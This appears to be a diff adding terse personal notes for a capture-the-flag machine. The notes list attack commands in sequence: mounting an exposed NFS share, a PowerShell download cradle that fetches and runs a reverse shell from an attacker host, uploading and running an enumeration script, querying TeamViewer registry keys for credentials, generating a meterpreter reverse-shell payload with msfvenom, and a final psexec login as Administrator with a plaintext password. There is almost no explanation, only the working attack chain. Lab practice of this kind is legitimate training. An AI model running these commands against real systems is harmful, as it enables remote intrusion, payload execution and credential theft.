@@ -1,0 +1,35 @@
+
+[To mount vulnerable dir to local dir]
+mount -o nolock -t nfs 10.10.10.180:/site_backups nfs
+
+[To download reverse shell]
+iex(New-Object Net.WebClient).DownloadString('http://10.10.14.39/shell.ps1')
+
+[Download JAWS in server]
+wget http://10.10.14.10/JAWS/jaws-enum.ps1 -OutFile jaws-enum.ps1
+
+
+[Create dir]
+mkdir C:\hacker
+
+[Run jaws]
+.\jaws-enum.ps1 -OutputFileName C:\hacker\res.txt
+
+[Copy res file to site_backups to download from nfs]
+COPY-ITEM "C:\hacker\res.txt" -Destination "C:\site_backups"
+
+
+[To look inside TeamViewer registry]
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7"
+
+
+[Generate meterpreter reverse shell payload]
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=2000 -f exe > injection.exe
+
+[Upload to server]
+wget http://10.10.14.5/injection.exe -OutFile injection.exe
+
+
+[FINALY]
+psexec.py Administrator@10.10.10.180
+password: !R3m0te!
